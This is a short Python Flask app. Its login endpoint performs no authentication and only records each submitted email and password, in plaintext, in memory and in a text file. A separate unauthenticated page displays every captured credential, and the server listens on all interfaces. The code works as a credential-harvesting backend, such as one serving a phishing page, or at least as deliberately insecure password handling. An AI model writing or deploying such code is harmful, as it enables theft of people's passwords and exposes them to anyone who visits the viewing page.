import time
from flask import Flask, request, render_template

app = Flask(__name__)

login_attempts = []

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    email = data.get('email')
    password = data.get('password')

    timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
    login_attempts.append({'timestamp': timestamp, 'email': email, 'password': password})

    with open('login_attempts.txt', 'a') as f:
        f.write(f'{timestamp} - Email: {email}, Password: {password}\n')

    return 'Login attempt successfully recorded', 200

@app.route('/view_login_attempts')
def view_login_attempts():
    return render_template('login_attempts.html', login_attempts=login_attempts)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
